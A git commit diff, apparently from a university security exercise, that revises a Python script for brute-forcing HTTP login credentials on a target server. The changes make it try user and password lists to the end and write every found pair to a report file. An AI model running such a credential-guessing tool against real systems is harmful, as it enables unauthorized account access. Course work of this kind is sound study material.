35388aec3e3c7cad6726913e88692e4d62bbbd87
andreagonz <andreagonz@ciencias.unam.mx>
2017-12-12 22:52:55 -0600

    correcciones

--- ejercicios/ejercicio7.py
+++ ejercicios/ejercicio7.py
@@ -17,7 +17,7 @@ def addOptions():
     parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
     parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
     parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
-    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
+    parser.add_option('-r','--report', dest='report', default='reporte.txt', help='File where the results will be reported.')
     parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
     parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
     opts,args = parser.parse_args()
@@ -42,14 +42,10 @@ def makeRequest(host, user, password):
         #print response
         #print dir(response)
         if response.status_code == 200:
-            s = 'CREDENCIALES ENCONTRADAS!: %s\t%s\n' % (user,password)
-            print s
-            escribe_archivo("resultado.txt", s)
             return True
-        else:
-            return False
     except ConnectionError:
         printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
+    return False
 
 def lista_archivo(archivo):
     f = open(archivo)
@@ -68,11 +64,13 @@ if __name__ == '__main__':
         url = buildURL(opts.server, port = opts.port)
         usuarios = lista_archivo(opts.user)
         passwords = lista_archivo(opts.password)
+        s = ""
         for u in usuarios:
-            for p in passwords:                        
+            for p in passwords:
                 if makeRequest(url, u, p):
-                   sys.exit()
-        print 'NO FUNCIONO :c '            
+                    s += 'CREDENCIALES ENCONTRADAS!: %s\t%s\n' % (u,p)
+        print s
+        escribe_archivo(opts.report, s)        
     except Exception as e:
         printError('Ocurrio un error inesperado')
         printError(e, True)
